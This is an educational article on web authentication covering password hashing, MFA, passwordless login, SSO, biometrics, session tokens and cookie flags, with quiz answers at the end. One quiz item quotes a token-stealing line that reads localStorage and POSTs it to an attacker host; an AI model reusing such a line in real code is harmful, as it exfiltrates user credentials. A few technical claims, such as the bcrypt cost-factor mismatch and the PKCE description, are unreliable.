## The Problem Story

A team of four engineers builds a task management app. They work for six months. They build a clean REST API, a responsive React frontend, a PostgreSQL database with normalized schemas, and a Redis cache for hot data. They deploy on a Friday. By Monday morning, 3,000 users have signed up. By Monday afternoon, User 47 notices something strange. When she types a task ID into the URL bar — `/tasks/392` — she sees User 392's private tasks. Meeting notes. Performance reviews. A draft resignation letter. Her heart rate spikes. She tries `/tasks/15`, `/tasks/208`, `/tasks/1047`. Every single one returns the full task object. The app has no concept of who is asking. The API accepts any request and returns whatever data exists at the given ID. There is no gatekeeper. There is no identity check. There is no lock on the door.

The founder gets the email at 02:13 on Tuesday morning. Subject line: "I can see everyone's data." The founder opens the database console. Every row in the tasks table has an `owner_id` column — the schema was designed correctly. But the API never reads that column. The API endpoint `GET /tasks/:id` runs `SELECT * FROM tasks WHERE id = :id` and returns the result. No `WHERE owner_id = current_user`. No token validation. No session check. The column exists for display purposes only. By 02:47, the founder checks the access logs. User 47 accessed 1,204 task records belonging to 612 different users over four hours. The data was always there for the taking. The app had all the features. The app had no authentication.

A healthcare scheduling startup tells a similar story. They built a patient portal where doctors could view lab results. The frontend hid the "View Results" button unless you were logged in. The frontend also sent the patient ID as a query parameter: `GET /api/results?patient_id=847`. Any logged-in doctor could change that number to `848`, `849`, or `850` and see any patient's lab results. The frontend was hiding the door. The backend had no lock. The team spent four months building a HIPAA-compliant database encryption strategy while leaving the API completely open. They spent a quarter million dollars on compliance certifications for a system that any user could break into with a URL edit. The database was encrypted at rest. The request was wide open in flight.

These are not edge cases. These are the most common security failure in web applications: building features without verifying identity. The frontend hides buttons. The backend checks nothing. The system trusts whoever knocks. The difference between an app that keeps data safe and an app that leaks everything is not encryption at rest, not a compliance certification, and not a fancy frontend. It is a single architectural layer that answers one question before any other: who is making this request, and can you prove it?

A social media platform hit 100 million monthly active users before conducting a security audit. The audit team logged in to a test account, opened the browser's developer tools, found the API endpoint for direct messages, changed the `conversation_id` parameter by 1, and read another user's private messages. They repeated this 200 times. They read 200 private conversations. The audit report opened with a single sentence: "The platform has no authentication on 87% of its API endpoints." The engineering team had built every feature the product roadmap required — news feed, stories, messaging, friend suggestions, comments, likes, sharing — without ever asking "who is the person on the other end of this request?" The API treated every incoming HTTP request as equally authorized. The result was not a bug. It was an architectural omission. The system was built to serve data, not to protect it. The difference between those two goals is authentication. The system was architecting for features without architecting for trust.

## The Insight

**Authentication** is the process of verifying that a person or system is who they claim to be. It is the act of checking ID before letting anyone through the door.

Think of a airport security checkpoint. You arrive at the airport. You walk up to the checkpoint. A security officer asks for your government-issued photo ID and your boarding pass. The officer looks at your face, looks at the photo on the ID, and decides whether they match. The officer scans the boarding pass against the airline's database to confirm that you have a valid ticket for a flight departing today. If both checks pass, you walk through to the secure area. If the face does not match the photo, you are stopped. If the boarding pass is invalid, you are stopped. The checkpoint does not care whether you are carrying valuable items, whether you have a first-class ticket, or what your travel history looks like. The checkpoint cares about one thing: are you actually the person named on that ID and do you have legitimate business being here today?

The mapping is precise. The user is the traveler. The login form is the checkpoint line. The credentials — email and password, fingerprint scan, or magic link — are the ID and boarding pass. The authentication service is the security officer who examines the credentials. The identity store — a database of user records with password hashes — is the airline's reservation system. The session token issued after successful authentication is the stamped boarding pass that lets you walk around the secure area without showing your ID again. Every time a request hits a protected resource, the system checks that stamped pass. No stamp, no access. Wrong stamp, no access. Expired stamp, no access. The entire security of the airport depends on the checkpoint. The entire security of your application depends on authentication.

Extend the analogy to understand the three grades of identity verification. A basic ID check — you show a photo ID, the officer glances at it — maps to single-factor password authentication. It works for low-risk scenarios: browsing a store, reading a blog post behind a login wall. A two-factor check — you show your ID AND scan your fingerprint at the automated gate — maps to MFA. It works for high-risk scenarios: accessing a financial dashboard, approving a money transfer, viewing medical records. A biometric-only check — you walk through a facial recognition gate at a smart airport — maps to passwordless biometric authentication. It works for high-frequency, low-friction scenarios: unlocking your phone, approving a payment under $50, opening your office door. Each grade accepts a different level of risk based on the sensitivity of what you are protecting.

The airport analogy also clarifies a critical distinction that many engineers get wrong: authentication is the ID check. It answers "who are you?" Authorization is the list of gates and lounges your ticket lets you enter. It answers "what are you allowed to do?" A traveler can pass authentication — show a valid ID and boarding pass — and still be stopped by authorization if the boarding pass is for a different flight. A user can pass authentication — provide correct credentials — and still be denied access to a resource if their role does not grant permission. Authentication is the door. Authorization is the list of rooms behind the door. You cannot get through the door without authentication. But getting through the door does not mean you can enter every room.

## Core Vocabulary

**Authentication** — The process of verifying identity. You must prove you are who you claim to be by presenting one or more factors — something you know, something you have, or something you are. Authentication happens at the start of every session and determines whether the system trusts the request.

**Credentials** — The evidence a user presents to prove identity. A password is a credential. A one-time code sent to your phone is a credential. A fingerprint scan is a credential. Credentials are the raw material of authentication. If credentials are weak, stolen, or shared, authentication is meaningless regardless of how robust the architecture is.

**Identity Provider (IdP)** — A dedicated service that stores user identities and handles authentication logic, often as a separate system from the application itself. An IdP issues assertions about who a user is so that applications can trust those assertions without storing passwords themselves. Okta, Auth0, Azure AD, and Keycloak are identity providers. Separating identity into a dedicated service means you do not build your own password database — and you inherit the security expertise of a team whose only job is authentication.

**Multi-Factor Authentication (MFA)** — An authentication method that requires two or more independent factors from different categories: something you know (password), something you have (phone or security key), and something you are (fingerprint or face). MFA matters because a stolen password alone is not enough to break in. If an attacker obtains your password, they still need your phone or your fingerprint. MFA blocks 99.9% of automated account takeover attacks.

**Passwordless** — An authentication method that eliminates passwords entirely by using temporary codes, magic links sent to email, push notifications to a mobile device, or biometric verification. Passwordless matters because passwords are the weakest link in authentication — 65% of people reuse passwords across multiple sites, and credential stuffing attacks exploit this at massive scale.

**Biometric Authentication** — Authentication based on physical characteristics: fingerprint, face, iris, or voice. Biometrics matter because they are hard to steal — you cannot copy someone's face from a data breach the way you can copy a password hash. Biometrics also matter because they are the fastest authentication method: a fingerprint scan takes under 500 milliseconds from touch to approval.

**SSO (Single Sign-On)** — An authentication scheme that lets you log in once and access multiple applications without re-entering credentials. SSO matters because it reduces password fatigue, eliminates the need to store passwords across dozens of services, and centralizes authentication policy — one login, one logout, one place to enforce MFA.

**Token** — A cryptographically signed string that represents an authenticated session or identity assertion, issued after successful authentication and presented with every subsequent request. Tokens matter because they eliminate the need to send credentials on every request — and because a stolen token is as dangerous as a stolen password if the token lacks expiration or is transmitted over an unencrypted channel.

**Authentication Factor** — One of three categories of evidence: knowledge (something you know, like a password), possession (something you have, like a phone or hardware key), and inherence (something you are, like a fingerprint). Factors matter because security increases with the number of independent factors — one factor is vulnerable to a single attack vector, two factors require the attacker to compromise two completely different systems.

**Challenge-Response** — A protocol where the system issues a challenge — a random value, a puzzle, or a code — and the user must produce the correct response to prove identity. Challenge-response matters because it prevents replay attacks: even if an attacker intercepts a previous response, the challenge is different each time and the old response is useless.

**Password Hash** — A one-way mathematical transformation of a password, stored in the database instead of the plain-text password. Hashing matters because if the database is breached, the attacker obtains the hash — not the password. A strong hashing algorithm (bcrypt, Argon2, scrypt) with a cost factor of 10 or higher makes reversing the hash computationally expensive even with specialized hardware.

**Salt** — A random, unique value added to each password before hashing, so that two users with the same password produce different hashes. Salting matters because it prevents rainbow table attacks — precomputed lookup tables of common password hashes become useless when every hash incorporates a unique random value.

**Session** — A server-side record of an authenticated user's interaction with the system, typically stored in a cache or database with an expiration time. Sessions matter because they bridge the stateless nature of HTTP with the need for continuous identity — without sessions, you would authenticate on every single page load.

**Refresh Token** — A long-lived credential issued alongside the short-lived access token, used to obtain new access tokens without re-authenticating. Refresh tokens matter because they allow short access token lifetimes (15 minutes) while keeping the user logged in for days or weeks — and because refresh tokens can be rotated and revoked independently of access tokens.

### Terminology in Practice

These terms appear in every authentication design conversation. Here is how they show up in real discussions:

"The IdP issues a signed JWT after successful authentication. The application verifies the token signature on every request. We do not store sessions — we trust the token. But the token expires in 15 minutes, so we need a refresh token flow with a 7-day expiry and a rotation policy."

"Passwordless with biometric MFA eliminates the credential stuffing attack surface entirely. The user authenticates with their face on the device — the biometric data never leaves the phone. A cryptographically signed assertion from the device proves the biometric check passed. This is the authentication model for 1.2 billion devices running modern mobile operating systems."

"When the database breach happened, the attacker obtained 12 million password hashes. We used bcrypt with cost factor 12 and per-user salts. The attacker has spent 8 months cracking and has recovered 0.03% of passwords. The salt made rainbow tables useless. The cost factor made brute force slow enough that rotating all passwords was faster than cracking them."

"The challenge-response protocol saved us from a replay attack. The attacker captured a valid authentication request from the network traffic and tried to replay it. But our server includes a nonce — a random number used once — in every challenge. The replayed request had the old nonce, which was already marked as used. The server rejected it. The attacker learned nothing."

"We use refresh token rotation with a fingerprint. Every time the client exchanges a refresh token for a new access token, the server issues a new refresh token and invalidates the old one. If a stolen refresh token is used after the legitimate client has already rotated it, the server detects the anomaly and revokes all tokens for that user — the account is automatically locked and the user gets a notification."

## The Big Picture

Before examining the individual steps, it helps to see the entire authentication system as a pipeline. Data flows through six distinct stages, each with a specific responsibility. The user does not see these stages. The user sees a loading spinner for 400 milliseconds and then a logged-in dashboard. But every one of those six stages must complete successfully for that spinner to resolve to a dashboard instead of an error page.

The pipeline has a fixed direction: credentials enter on the left, a session token exits on the right. If any stage fails — the identity store is slow, the password hash does not match, the MFA code is expired, the token has been revoked — the pipeline stops and returns an error. There is no bypass. There is no shortcut. The pipeline is the only way through.

## Step-by-Step: The Authentication Lifecycle

Authentication is not a single event. It is a sequence of discrete operations, each with its own failure modes and performance characteristics. Here is the exact flow, from the initial credential submission to the subsequent authenticated request.

### Step 1: Credential Submission

You type your email and password into the login form and click Submit. The frontend sends a POST request to `/auth/login` with the credentials in the request body. This is the moment the system learns who you claim to be.

### Step 2: Credential Validation

The auth service receives the POST request and performs basic validation before touching the database. Is the email a valid format? Is the password non-empty? Is the request body well-formed JSON? Is the request within acceptable size limits? This validation rejects malformed or obviously invalid input in under 5 milliseconds — without any database call. A hacker sending 10,000 garbage requests per second gets rejected at this layer, never reaching the identity store.

Validation happens at three levels. First, structural validation: the request body must parse as valid JSON, the email field must be a string, the password field must be a string. Second, format validation: the email must match a basic regex pattern (local-part@domain.tld), the password must be between 8 and 128 characters. Third, semantic validation: the email domain must not be a known disposable email provider (if your policy blocks them), the password must not be on a list of common breached passwords (if your policy checks against HaveIBeenPwned).

If validation fails, the service returns a 400 Bad Request with a generic error message: "Invalid email or password format." The response does not reveal whether the email was wrong or the password was wrong — that information helps attackers enumerate valid accounts. A hacker who receives "email format invalid" for `alice@example.com` and "password too short" for `bob@example.com` learns that `alice@example.com` exists (the service parsed the email format successfully) and `bob@example.com` does not (the service rejected the email before checking the password). Generic error messages prevent this information leak.

### Step 3: Identity Lookup

The auth service queries the identity store by email. In a typical system, this is a parameterized SQL query: `SELECT id, password_hash, salt, mfa_enabled FROM users WHERE email = $1`. The database lookup takes 1-5 milliseconds on a local index scan. If no row exists, the service returns a 401 Unauthorized — again with a generic message.

This is a critical performance checkpoint. A single database query per login attempt at 500 requests per second means 500 queries per second on the identity store. Most authentication databases handle this easily. But if lookup takes 50 milliseconds due to a missing index or a hot replica lagging behind the primary, the 95th percentile login latency spikes from 10ms to 150ms — and users feel the delay.

### Step 4: Password Verification

The auth service retrieves the stored salt and password hash for the user. It takes the submitted plain-text password, appends the stored salt, runs the concatenated string through bcrypt (or Argon2 or scrypt) with the configured cost factor, and compares the resulting hash against the stored hash. If they match, the password is correct. If they do not match, the service returns a 401.

The comparison itself matters as much as the hashing. You must use a constant-time comparison function — one that takes the same amount of time regardless of how many characters match. A naive `==` comparison returns false as soon as the first non-matching byte is found. An attacker who can measure response times within 1 microsecond can guess the hash one byte at a time: if the comparison takes 1.2 microseconds when the first byte matches and 0.8 microseconds when it does not, the attacker knows which first byte is correct. A constant-time comparison always compares every byte, so the response time reveals nothing about which bytes matched.

Password verification is intentionally slow. Bcrypt with cost factor 12 takes approximately 250 milliseconds on modern hardware to compute a single hash. That 250ms is a security feature — it means a brute-force attack that tries 1,000 passwords per second against a single account takes 250 seconds of CPU time per account. An attacker with a botnet of 10,000 machines can still crack only 40 passwords per second per account because each guess costs a quarter second of computation. Lower the cost factor to 4, and that drops to 4 milliseconds per hash — and the attacker cracks 250 passwords per second.

### Step 5: MFA Challenge (If Enabled)

The user has MFA enabled. The auth service checks the `mfa_enabled` flag on the user record and initiates the second-factor challenge. The service generates a one-time code (6-8 digits, valid for 30-60 seconds) using a TOTP algorithm seeded by the user's MFA secret key. The code is sent to the user's registered device — SMS, authenticator app push notification, or email. The service responds to the initial login request with a 200 OK and a status indicating MFA is required, but does not issue a session token yet.

The user enters the code. The frontend sends a second request to `/auth/mfa/verify` with the code and a temporary MFA session identifier. The auth service verifies the code against the TOTP algorithm using the user's stored secret. If the code is valid and within the time window, the service proceeds to token generation.

The TOTP algorithm works on a precise time window. The current Unix timestamp is divided by 30 (the standard window size). The result is the time step. The HMAC-SHA1 hash of that time step, using the user's secret key as the HMAC key, produces a 20-byte hash. The last 4 bits of the hash determine an offset. The 4 bytes starting at that offset are truncated to 31 bits and modulo 10^6 to produce a 6-digit code. The authenticator app and the server both compute the same code independently — the app uses the user's phone clock, the server uses its own clock. If the clocks drift by more than one time step, the codes do not match. This is why TOTP implementations typically accept codes from the current step plus one step before and one step after — a three-step window of 90 seconds.

The choice of MFA channel matters for security. TOTP via authenticator app is the most secure channel because the secret never crosses a network. SMS-based MFA is vulnerable to SIM-swap attacks — an attacker convinces the phone carrier to transfer the phone number to a new SIM card, and all SMS codes go to the attacker's device. The National Institute of Standards and Technology (NIST) deprecated SMS as an out-of-band verification method in 2016. Push notification MFA sits between TOTP and SMS in security: the push message itself is encrypted, but the user must recognize a fraudulent push request and reject it — a cognitive burden that many users struggle with.

### Step 6: Token Generation

The auth service creates a session token. In most modern systems, this is a JSON Web Token (JWT) containing the user ID, the session ID, the issued-at timestamp, and the expiration timestamp — all cryptographically signed with a private key known only to the auth service. The token is not encrypted (JWTs are signed, not encrypted by default). The payload is readable by anyone who possesses the token, but only the auth service can create a valid signature.

The auth service also writes the session to the session store — a Redis cache with a time-to-live (TTL) matching the token expiration. The Redis entry maps `session_id -> user_id, created_at, last_accessed_at`. This lookup enables the service to revoke sessions by deleting the Redis key — a capability that unsigned tokens do not support.

### Step 7: Response with Token

The auth service responds to the login request with a 200 OK. The response body includes the user profile data and token metadata (expiration time, issued time, token type). The critical part of the response is not the body — it is the `Set-Cookie` header.

The cookie is configured with three security flags. `HttpOnly` prevents JavaScript from reading the cookie — even if an XSS vulnerability exists in the frontend, the attacker cannot extract the token. `Secure` ensures the browser only sends the cookie over HTTPS — an attacker on the same Wi-Fi network cannot capture the cookie from plain HTTP traffic. `SameSite=Strict` prevents the browser from sending the cookie on cross-origin requests — a user who clicks a link to your site from an attacker's page does not send the cookie automatically, which blocks CSRF attacks. Without these three flags, the token is vulnerable to theft via XSS, network interception, and cross-site request forgery.

The frontend stores the user profile in memory — not in `localStorage`, not in `sessionStorage`, and not in a JavaScript-accessible cookie. Storing tokens in `localStorage` is a common mistake that exposes the token to any JavaScript running on the same origin, including third-party scripts, analytics libraries, and browser extensions. The in-memory store is cleared on page refresh, at which point the HTTP-only cookie is still present and the frontend fetches the profile again using the cookie as authentication.

### Step 8: Subsequent Authenticated Requests

You navigate to the tasks page. The browser sends `GET /api/tasks` with the session cookie attached automatically. The API gateway or application middleware intercepts every request, extracts the token from the cookie, and performs three checks before any business logic runs.

First, signature verification: is the token cryptographically signed by a trusted key? The middleware loads the public key of the auth service (or the IdP) and verifies the token's signature. If the signature is invalid — the token was tampered with, or it was signed by an unknown key — the request is rejected with a 401. This check takes under 1 millisecond using an optimized cryptographic library.

Second, expiration check: has the token expired? The middleware reads the `exp` claim from the JWT payload and compares it against the current server time. If the token has expired, the middleware returns a 401 with a specific error code that tells the frontend to attempt a refresh token exchange. If the refresh token is also expired, the user is redirected to the login page.

Third, session validation: does the session still exist in Redis (or has it been revoked)? The middleware queries Redis with the session ID from the token: `GET session:s_8472`. If the key does not exist (the session was revoked by an administrator, or the user was logged out from another device), the request is rejected with a 401. This check adds 1-3 milliseconds of latency but enables immediate session revocation — a capability that stateless JWT tokens alone cannot provide.

If all three checks pass, the system extracts the `user_id` from the token and passes it to the downstream service as a request header: `X-User-Id: 8472`. The downstream service never parses the token itself — it trusts the header because the API gateway already validated the token. The task service uses `WHERE owner_id = 8472` to filter data. User 8472 sees only User 8472's tasks. User 47 cannot see User 392's tasks because the authenticated user ID is embedded in every request at the infrastructure layer, not in the URL. The request never reaches the task service unless the token passes all three checks.

## Authentication Variants

Authentication is not one technology. It is a family of approaches, each with different security properties, user experience characteristics, and operational trade-offs. Here are the five most common variants, with guidance on when to use each.

### Variant 1: Password-Based Authentication

The classic model. You register with an email and a password. The server hashes the password with a salt and stores the hash. On login, you submit the same email and password. The server hashes the submitted password with the same salt and compares the result against the stored hash. If they match, you are authenticated. This is the baseline that every other variant improves upon.

Password-based authentication faces three primary attack vectors. Credential stuffing: attackers take email-password pairs leaked from previous breaches and try them against your application. Rate limiting and breach-checking at registration (rejecting passwords that appear in known breach databases) are the primary defenses. Brute force: attackers try thousands of common passwords against a single account. Account lockout after 5 failed attempts and exponential backoff between attempts are the primary defenses. Phishing: attackers trick you into entering your credentials on a fake login page. MFA is the only effective defense against phishing because the attacker gets the password but cannot complete the second factor.

**When to use:**
- You are building a general-purpose web application with standard security requirements
- Your users expect the email-password pattern and are familiar with it
- You have the operational maturity to implement proper password hashing (bcrypt with cost factor 12, per-user salts) and enforce password policies
- You can combine it with MFA to compensate for its fundamental weakness: passwords can be stolen

**When not to use:**
- You are building for an audience that reuses passwords across sites (65% of all users) — credential stuffing attacks will hit you immediately
- You cannot enforce MFA and your application contains sensitive data — a single password breach compromises the account
- Your application serves users who cannot reliably remember passwords (elderly users, children, users with accessibility needs)
- You are building a mobile-first application where typing passwords is a poor user experience

### Variant 2: Passwordless Authentication (Magic Links and OTP)

You enter your email address on the login page. The system generates a unique, single-use, time-limited token — a cryptographically random string encoded as a URL (magic link) or a 6-digit numeric code (OTP). The system sends the link or code to your registered email or phone. You click the link or enter the code. The system verifies the token is valid, not expired, and not yet used, then authenticates you.

No password is ever created. No password hash is ever stored. The credential is the temporary token sent to your verified contact method.

- Your users are non-technical or have low password literacy — they struggle with password creation rules, reuse passwords, and forget them regularly
- You are building a mobile application where typing a 6-digit code is faster than typing a password
- Your login volume is moderate — each magic link costs an email send (approximately 0.01 cent per send at scale) and introduces 1-5 seconds of delivery latency

**When not to use:**
- Your application requires sub-second login latency — magic links depend on email delivery speed, which ranges from 300 milliseconds to 30 seconds
- You are building for a real-time system where users authenticate multiple times per session — OTP fatigue is real and users abandon after 3-4 code requests
- You cannot secure the email channel — if the user's email is compromised, passwordless authentication is compromised
- Your application operates in a regulatory environment that requires knowledge factors (finance, healthcare in some jurisdictions)

### Variant 3: SSO and Federated Authentication

You click "Sign in with Google" or "Sign in with GitHub." The browser redirects you to the identity provider's (IdP) authentication page. You authenticate with the IdP using whatever method that IdP supports — password, passkey, biometric, or MFA. The IdP generates a signed assertion (a SAML assertion or an OpenID Connect ID token) and redirects you back to the application with that assertion. The application verifies the assertion's cryptographic signature against the IdP's public key, extracts your identity from it, and creates a local session.

Your credentials never reach the application. The application never stores your password. The identity provider handles all authentication logic and security.

Two protocols dominate SSO. SAML 2.0 (Security Assertion Markup Language) uses XML-based assertions and is the standard for enterprise applications — Okta, Azure AD, and OneLogin all support SAML. The SAML flow involves the identity provider (IdP) and the service provider (SP). The SP generates an authentication request, redirects you to the IdP, the IdP authenticates you and posts a signed SAML assertion back to the SP's assertion consumer service endpoint. OpenID Connect (OIDC) is the modern replacement for SAML, built on top of OAuth 2.0. OIDC uses JSON-based ID tokens (JWTs) instead of XML assertions. The OIDC flow is simpler: the application redirects to the IdP's authorization endpoint, the IdP authenticates you and redirects back with an authorization code, the application exchanges the authorization code for an ID token and access token at the IdP's token endpoint.

The redirect flow has a subtle security property: the authorization code is exchanged server-side, not in the browser. This means the token never passes through the browser, so a compromised browser extension cannot steal it. The application receives the authorization code from the browser, then makes a server-to-server HTTPS request to the IdP's token endpoint with the code plus the application's client secret. The IdP validates the code and the secret, and returns the tokens. This two-step flow — authorization code then token exchange — is called the authorization code flow with PKCE (Proof Key for Code Exchange).

**When to use:**
- You are building a B2B application where enterprises require SAML/SSO integration with their corporate IdP (Okta, Azure AD, OneLogin)
- You want users to start using your application with zero registration friction — one click, no form, no password
- You operate multiple applications or services and want a unified login experience across them
- You want to outsource MFA enforcement, password policy, and account recovery to a provider that specializes in authentication security

**When not to use:**
- You have no control over the IdP's uptime — if Google is down, your login is down, and you cannot authenticate anyone
- Your application needs to operate fully offline or in air-gapped environments where external redirects are impossible
- You cannot accept the IdP's terms regarding user data — SSO gives the IdP information about who uses your application, when, and from where
- Your threat model includes the IdP itself — a compromised IdP compromises every application that trusts it

### Variant 4: Biometric Authentication

You place your finger on a sensor or look at a camera. The device captures the biometric sample, extracts a feature set (distinctive points on your fingerprint or face), and compares it against the enrolled template stored in the device's secure enclave. The comparison result — a binary pass or fail — is what the application receives. The raw biometric data never leaves the device.

Biometric authentication is fundamentally different from password authentication because the biometric is not a secret you can change. You have ten fingerprints. If one is compromised, you have nine left. You have one face. If your face template is compromised, you cannot get a new face. This is why production systems never transmit or store raw biometric data — the comparison happens inside the device's secure hardware.

Biometric systems have two error rates that matter in system design. False rejection rate (FRR) is the percentage of legitimate users who are incorrectly rejected — a 5% FRR means 5 out of every 100 legitimate users cannot authenticate on their first attempt. False acceptance rate (FAR) is the percentage of impostors who are incorrectly accepted — a 0.001% FAR means 1 out of every 100,000 impostors passes the biometric check. The two rates trade off against each other: lowering the threshold for a match reduces FRR but increases FAR. Production systems tune the threshold based on the application's risk profile. A phone unlock screen targets FRR under 5% with FAR under 0.001%. A nuclear facility access control targets FAR under 0.00001% even if FRR reaches 10%.

**When to use:**
- You are building a mobile application where user experience is paramount — biometric unlock takes under 500 milliseconds versus 5-10 seconds for password entry
- Your users authenticate dozens of times per day — biometrics eliminate password fatigue for high-frequency interactions
- You are building for modern smartphones where secure enclave hardware is standard — every iPhone since the iPhone 5S and every Android device with a fingerprint sensor has a trusted execution environment
- You need strong local authentication that works offline — biometric unlock works without network connectivity

**When not to use:**
- You cannot control the hardware — biometric authentication on commodity laptop cameras without secure enclave support is trivial to bypass with a photograph
- You need to authenticate users across multiple devices from a single enrollment — biometric templates are generally device-specific and cannot be shared
- Your application must support fallback for users whose biometrics change (injury, aging, medical treatment) — every biometric system needs a password or PIN fallback
- You are building for a global audience where biometric recognition accuracy varies across demographic groups — some facial recognition systems have significantly higher error rates for women and people with darker skin tones

### Variant 5: Multi-Factor Authentication (MFA)

MFA is not a standalone authentication method. It is a layering strategy that combines two or more independent factors. The most common MFA pattern: password (knowledge factor) plus a time-based one-time code from an authenticator app (possession factor). The attacker must both know the password and possess the phone to authenticate.

The critical security property of MFA is factor independence. The password lives in the user's memory and in the server's database. The TOTP secret lives on the user's phone and on the server. Compromising the password database does not give the attacker access to the TOTP secrets. Compromising the phone does not give the attacker the password. The attacker must breach two completely separate systems.

The gold standard of MFA is FIDO2/WebAuthn with a hardware security key (YubiKey, Google Titan, or a built-in platform authenticator like Apple's Touch ID or Windows Hello). FIDO2 uses public-key cryptography instead of shared secrets. During registration, the hardware key generates a public-private key pair. The public key is sent to the server. The private key never leaves the hardware key — it cannot be extracted even if the device is compromised. During authentication, the server sends a challenge (a random byte string), the hardware key signs the challenge with the private key, and the server verifies the signature with the stored public key. This eliminates phishing entirely: the signature is bound to the specific origin (domain), so a fake login page at `examp1e.com` cannot replay the signature against `example.com`.

- You are building an administrative interface, a payment system, or any application where a single compromised account causes significant damage
- Your users access the application from untrusted networks (public Wi-Fi, shared computers, travel) where session hijacking is a realistic threat

**When not to use:**
- Your application requires sub-second login latency for every user in every session — adding an MFA step adds 10-30 seconds of interaction time per login
- You are building for users who lack access to a second device or who are not technically capable of managing an authenticator app — in this case, offer MFA as optional, not mandatory
- You have not implemented account recovery — users who lose their phone are locked out permanently unless you have a recovery code flow
- Your threat model does not include compromised passwords — this applies almost nowhere in practice, but a read-only public information portal might reasonably skip MFA

## Mental Model Check

Test your understanding of these concepts. Work through each question before reading the answer.

**Question 1:** A user logs in with the correct email and password. The system returns a 401 Unauthorized. What are three possible causes?

**Answer:** (1) The password hash in the database is corrupted or was generated with a different algorithm version — a bcrypt hash from cost factor 10 does not match a bcrypt hash from cost factor 12 even with the same password and salt. (2) The salt stored in the database does not match the salt used during registration — a data migration that truncated or transformed the salt column causes every subsequent verification to fail. (3) The account is locked or disabled — the user record has an `account_status` flag set to `locked` after 5 failed attempts, `disabled` by an administrator, or `pending` awaiting email verification.

**Question 2:** An application uses JWT tokens with a 24-hour expiration and stores no server-side session. A user reports that their account was accessed from another device while they were logged in. The user did not share their password. What happened?

**Answer:** The token was stolen. Without server-side session storage, there is no way to revoke a token before its natural expiration — the token is valid until it expires, regardless of who holds it. The token could have been stolen via an XSS attack (if the token was stored in `localStorage` instead of an HTTP-only cookie), a man-in-the-middle attack on an unencrypted network (if HTTPS was not enforced), or a browser extension that read cookies. The fix: implement server-side session storage with a blocklist or Redis-backed revocation, reduce token expiration to 15 minutes with a refresh token rotation flow, and ensure cookies use HTTP-only, Secure, and SameSite=Strict flags.

**Question 3:** A passwordless authentication system sends a 6-digit OTP to the user's email. An attacker writes a script that submits random 6-digit codes to the verify endpoint at 10,000 requests per second. How do you defend against this?

**Answer:** Three defenses. (1) Rate limiting: allow 3 OTP verification attempts per session per 60 seconds. After 3 failures, lock the session for 5 minutes. This limits the attacker to 3 guesses per minute per session — 0.0003% of the 1,000,000 possible 6-digit codes per minute. (2) Short expiry: the OTP is valid for 60 seconds. The attacker must guess the code within 60 seconds, and the rate limit caps them at 3 attempts within that window. (3) Exponential backoff on the OTP request itself: each request for a new OTP doubles the wait time. After 5 requests, the user waits 16 minutes for the next OTP. This prevents the attacker from rapidly cycling through sessions.

**Question 4:** A company implements SSO with Google for all internal applications. Google experiences a 45-minute outage. Employees cannot log in to the expense reporting system, the HR portal, the code repository, or the email client. How do you design for this failure mode?

**Answer:** Three strategies. (1) Session longevity: set session tokens to 24 hours with refresh token support. Users who logged in before the outage continue working because their sessions have not expired. Only users whose sessions expired during the 45-minute window are affected. (2) Fallback identity provider: configure a secondary IdP as a backup. If Google authentication fails, fall back to a local identity store with cached credentials for critical internal applications. (3) Offline credentials: for essential systems (email, code repository), cache a password hash or API token on the device so the user can authenticate locally even when the IdP is unreachable.

**Question 5:** A biometric authentication system on a laptop camera falsely rejects 5% of legitimate users. Users get frustrated, disable biometrics, and go back to passwords. The password-only users then get phished at a rate of 3% per year. Which authentication approach is more secure at the population level?

**Answer:** The biometric system with a 5% false rejection rate is still more secure for the population than a password-only system — assuming the biometric system covers 95% of users and the 5% who are falsely rejected can fall back to a different authentication method. The calculation: 100,000 users on biometrics = 5,000 false rejections (these users fall back to passwords). Of those 5,000, 3% get phished = 150 accounts compromised. Meanwhile, 95,000 users on biometrics: zero accounts compromised by phishing. Total compromised: 150 accounts. Compare to 100,000 users on passwords: 3,000 accounts compromised by phishing. The biometric system reduces account compromise by 95% despite the false rejection rate. This is the key insight: perfect is the enemy of good. A biometric system that works for 95% of users is dramatically better than a password system that fails for 100% of users.

**Question 6:** An authentication system stores tokens in `localStorage` on the browser. A third-party analytics script loaded on the page is compromised and runs `const token = localStorage.getItem('auth_token'); fetch('https://evil.com/steal', { method: 'POST', body: token })`. What architectural change prevents this?

**Answer:** Three changes. (1) Store the token in an HTTP-only cookie instead of `localStorage`. The `HttpOnly` flag tells the browser to prevent JavaScript from reading the cookie. The analytics script cannot access `document.cookie` when the cookie is HTTP-only. (2) Set the `SameSite=Strict` flag on the cookie so it is not sent on cross-origin requests — even if the attacker tricks the user into clicking a malicious link, the browser does not include the cookie. (3) Set the `Secure` flag so the cookie is only transmitted over HTTPS — an attacker intercepting network traffic cannot capture the cookie from plain HTTP. These three flags — `HttpOnly`, `Secure`, `SameSite=Strict` — form the minimum security baseline for any cookie-based authentication system.
